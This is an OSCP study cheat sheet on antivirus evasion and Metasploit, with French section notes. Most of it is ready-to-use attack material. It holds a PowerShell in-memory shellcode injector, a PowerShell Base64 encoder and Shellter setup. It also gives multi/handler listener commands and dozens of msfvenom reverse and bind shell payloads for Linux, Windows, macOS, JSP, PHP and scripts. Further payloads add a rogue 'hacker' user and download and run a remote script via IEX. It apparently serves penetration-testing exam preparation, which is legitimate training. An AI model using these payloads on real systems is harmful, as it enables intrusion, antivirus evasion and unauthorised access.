---
title: "OSCP · Antivirus et Metasploit"
description: "Références sur les protections, charges utiles et outils de laboratoire."
---

# OSCP · Antivirus et Metasploit

Références sur les protections, charges utiles et outils de laboratoire.


## In-Memory Injection with PowerShell Script

Examiner les entrées et les réponses de l'application web.


### Payload


<p class="oscp-command-note">Créer un fichier de sortie avec msfvenom.</p>

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=[IP] LPORT=[PORT] -f powershell -v sc
```


### Script


<p class="oscp-command-note">Script PowerShell dans la rubrique « Script ».</p>

```powershell
# Import necessary functions from kernel32.dll and msvcrt.dll
$importCode = '
[DllImport("kernel32.dll", SetLastError=true)]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, UInt32 dwSize, UInt32 flAllocationType, UInt32 flProtect);

[DllImport("kernel32.dll", SetLastError=true)]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, UInt32 dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, UInt32 dwCreationFlags, IntPtr lpThreadId);

[DllImport("msvcrt.dll", SetLastError=false)]
public static extern IntPtr memset(IntPtr dest, int c, UInt32 count);
';

# Add the imported functions to the PowerShell session
$win32Functions = Add-Type -MemberDefinition $importCode -Name "Win32API" -Namespace "Win32" -PassThru;

# Define the shellcode (replace with actual shellcode)
[Byte[]] $shellcode = [PLACE YOUR SHELLCODE HERE];

# Allocate memory for the shellcode
$memSize = 0x1000;
if ($shellcode.Length -gt $memSize) { $memSize = $shellcode.Length };
$allocatedMemory = $win32Functions::VirtualAlloc([IntPtr]::Zero, $memSize, 0x3000, 0x40);

# Copy the shellcode into the allocated memory
for ($i = 0; $i -lt $shellcode.Length; $i++) {
    $win32Functions::memset($allocatedMemory + $i, $shellcode[$i], 1);
}

# Execute the shellcode in a new thread
$win32Functions::CreateThread([IntPtr]::Zero, 0, $allocatedMemory, [IntPtr]::Zero, 0, [IntPtr]::Zero);

# Keep the script running
# This part of the script ensures that the PowerShell process doesn't terminate immediately after the shellcode is executed.
# If the script exits too soon, the thread created to execute the shellcode might be terminated, stopping the shellcode.
# By keeping the script alive with an infinite loop and a sleep command, the shellcode has sufficient time to run.
while ($true) {
    Start-Sleep 60;
}
```


<p class="oscp-command-note">Script Python lié à « Script ».</p>

```python
#!/usr/bin/env python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
__version__ = '0.1'
__author__ = 'Carlos Perez, Carlos_Perez@darkoperator.com'
__doc__ = """
PSEncoder http://www.darkoperator.com by Carlos Perez, Darkoperator

Encodes a given Windows PowerShell script in to a Base64 String that can be
passed to the powershell.exe program as an option.
"""
import base64
import sys
import re
import os
import getopt

def powershell_encode(data):
    # blank command will store our fixed unicode variable
    blank_command = ""
    powershell_command = ""
    # Remove weird chars that could have been added by ISE
    n = re.compile(u'(\xef|\xbb|\xbf)')
    # loop through each character and insert null byte
    for char in (n.sub("", data)):
        # insert the nullbyte
        blank_command += char + "\x00"
    # assign powershell command as the new one
    powershell_command = blank_command
    # base64 encode the powershell command
    powershell_command = base64.b64encode(powershell_command.encode())
    return powershell_command.decode("utf-8")

def usage():
    print("Version: {0}".format(__version__))
    print("Usage: {0} <options>\n".format(sys.argv[0]))
    print("Options:")
    print("   -h, --help                  Show this help message and exit")
    print("   -s, --script      <script>  PowerShell Script.")
    sys.exit(0)

def main():
    try:
        options, args = getopt.getopt(sys.argv[1:], 'hs:', ['help', 'script='])
    except getopt.GetoptError:
        print("Wrong Option Provided!")
        usage()
    if len(sys.argv) == 1:
        usage()

    for opt, arg in options:
        if opt in ('-h', '--help'):
            usage()
        elif opt in ('-s', '--script'):
            script_file = arg
            if not os.path.isfile(script_file):
                print("The specified powershell script does not exists")
                sys.exit(1)
            else:
                ps_script = open(script_file, 'r').read()
                print(powershell_encode(ps_script))

if __name__ == "__main__":
    main()
```


## Shellter (Automatic Tool)




```text
apt-cache search shellter && sudo apt install shellter
```


<p class="oscp-command-note">Gérer les paquets Debian/Ubuntu.</p>

```bash
sudo apt install wine
```


<p class="oscp-command-note">Examiner ou gérer les paquets installés.</p>

```text
dpkg --add-architecture i386 && apt-get update && apt-get install wine32
```


<p class="oscp-command-note">Ouvrir la console Metasploit.</p>

```text
msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST [IP];set LPORT [PORT];run;"
```


## Metasploit




```bash
sudo msfdb init
sudo systemctl enable postgresql
sudo msfconsole
```




```text
workspace -a [nameToGive]
```




```text
search type:auxiliary smb
```




```text
services -p 445 --rhosts
```


<p class="oscp-command-note">Créer un fichier de sortie avec msfvenom.</p>

```bash
# Show available payloads
msfvenom -l payloads

# List payload options
msfvenom -p [PAYLOAD] --list-options

# Payload encoding
msfvenom -p [PAYLOAD] -e [ENCODER] -f [FORMAT] -i [ENCODE] [COUNT_OF_ENCODING] LHOST=[IP] LPORT=[PORT]
```


### Listeners


<p class="oscp-command-note">Ouvrir un port d&#x27;écoute Netcat.</p>

```bash
# Using Netcat, for NON-Stage payloads ONLY.
nc -nvlp <LISTENING_PORT>

# Using Metasploit (usage forbidden in the exam)
msf>use exploit/multi/handler  
msf>set payload windows/meterpreter/reverse_tcp  
msf>set lhost <IP>  
msf>set lport <PORT>  
msf> set ExitOnSession false  
msf>exploit -j

# To get multiple session on a single multi/handler, you need to set the ExitOnSession option to false and run the exploit -j instead of just the exploit; the -j option is to keep all the connected session in the background.
```


### Main Payloads


<p class="oscp-command-note">Créer un fichier de sortie avec msfvenom.</p>

```bash
# Linux
msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell.elf

# Windows
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell.exe

# Apache Tomcat (JSP)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.jsp

# Apache Tomcat (WAR)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > shell.war

# ASP
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > shell.asp

# ASPX
msfvenom -f aspx -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<443> -o shell64.aspx

# Bash
msfvenom -p cmd/unix/reverse_bash LHOST=<IP> LPORT=<PORT> -f raw > shell.sh

# JavaScript Shellcode
msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f js_le -o shellcode

# JSP
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.jsp

# Perl
msfvenom -p cmd/unix/reverse_perl LHOST=<IP> LPORT=<PORT> -f raw > shell.pl

# PHP:  we need to add the <?php at the first line of the file so that it will execute as a PHP webpage
msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > shell.php

cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php

# Python
msfvenom -p cmd/unix/reverse_python LHOST=<IP> LPORT=<PORT> -f raw > shell.py

# WAR
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > shell.war
```


### Complémentaire Payloads


**msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf**


<p class="oscp-command-note">Créer un fichier de sortie avec msfvenom.</p>

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf
```


**msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=IP LPORT=PORT -f elf > shell.elf**




```bash
msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=IP LPORT=PORT -f elf > shell.elf
```


**msfvenom -p linux/x64/shell_bind_tcp RHOST=IP LPORT=PORT -f elf > shell.elf**




```bash
msfvenom -p linux/x64/shell_bind_tcp RHOST=IP LPORT=PORT -f elf > shell.elf
```


**msfvenom -p linux/x64/shell_reverse_tcp RHOST=IP LPORT=PORT -f elf > shell.elf**




```bash
msfvenom -p linux/x64/shell_reverse_tcp RHOST=IP LPORT=PORT -f elf > shell.elf
```


**msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe**




```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe
```


```bash
msfvenom -p windows/meterpreter_reverse_http LHOST=IP LPORT=PORT HttpUserAgent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" -f exe > shell.exe
```


**msfvenom -p windows/meterpreter/bind_tcp RHOST=IP LPORT=PORT -f exe > shell.exe**




```bash
msfvenom -p windows/meterpreter/bind_tcp RHOST=IP LPORT=PORT -f exe > shell.exe
```


**msfvenom -p windows/shell/reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe**




```bash
msfvenom -p windows/shell/reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe
```


**msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe**




```bash
msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe
```


**msfvenom -p windows/adduser USER=hacker PASS=password -f exe > useradd.exe**




```bash
msfvenom -p windows/adduser USER=hacker PASS=password -f exe > useradd.exe
```


**msfvenom -p osx/x86/shell_reverse_tcp LHOST=IP LPORT=PORT -f macho > shell.macho**




```bash
msfvenom -p osx/x86/shell_reverse_tcp LHOST=IP LPORT=PORT -f macho > shell.macho
```


**msfvenom -p osx/x86/shell_bind_tcp RHOST=IP LPORT=PORT -f macho > shell.macho**




```bash
msfvenom -p osx/x86/shell_bind_tcp RHOST=IP LPORT=PORT -f macho > shell.macho
```


**msfvenom -p cmd/unix/reverse_python LHOST=IP LPORT=PORT -f raw > shell.py**




```bash
msfvenom -p cmd/unix/reverse_python LHOST=IP LPORT=PORT -f raw > shell.py
```


**msfvenom -p cmd/unix/reverse_bash LHOST=IP LPORT=PORT -f raw > shell.sh**




```bash
msfvenom -p cmd/unix/reverse_bash LHOST=IP LPORT=PORT -f raw > shell.sh
```


**msfvenom -p cmd/unix/reverse_perl LHOST=IP LPORT=PORT -f raw > shell.pl**




```bash
msfvenom -p cmd/unix/reverse_perl LHOST=IP LPORT=PORT -f raw > shell.pl
```


**msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f asp > shell.asp**




```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f asp > shell.asp
```


**msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f raw > shell.jsp**




```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f raw > shell.jsp
```


**msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f war > shell.war**




```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f war > shell.war
```


**msfvenom -p php/meterpreter_reverse_tcp LHOST=IP LPORT=PORT -f raw > shell.php cat shell.php**




```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=IP LPORT=PORT -f raw > shell.php cat shell.php
```


**msfvenom -p php/reverse_php LHOST=IP LPORT=PORT -f raw > phpreverseshell.php**




```bash
msfvenom -p php/reverse_php LHOST=IP LPORT=PORT -f raw > phpreverseshell.php
```


```bash
msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.webClient).downloadString('[http://IP/nishang.ps1')\](http://ip/nishang.ps1')%5C)"" -f python
```


**msfvenom -p windows/shell_reverse_tcp EXITFUNC=process LHOST=IP LPORT=PORT -f c -e x86/shikata_ga_nai -b "\x04\xA0"**




```bash
msfvenom -p windows/shell_reverse_tcp EXITFUNC=process LHOST=IP LPORT=PORT -f c -e x86/shikata_ga_nai -b "\x04\xA0"
```


**msfvenom -p windows/shell_reverse_tcp EXITFUNC=process LHOST=IP LPORT=PORT -f c -e x86/fnstenv_mov -b "\x04\xA0"**




```bash
msfvenom -p windows/shell_reverse_tcp EXITFUNC=process LHOST=IP LPORT=PORT -f c -e x86/fnstenv_mov -b "\x04\xA0"
```

---

Source documentaire : [OSCP+ Cheatsheet d'Emmanuel Solis](https://www.emmanuelsolis.com/oscp.html).

<!-- refined-oscp -->
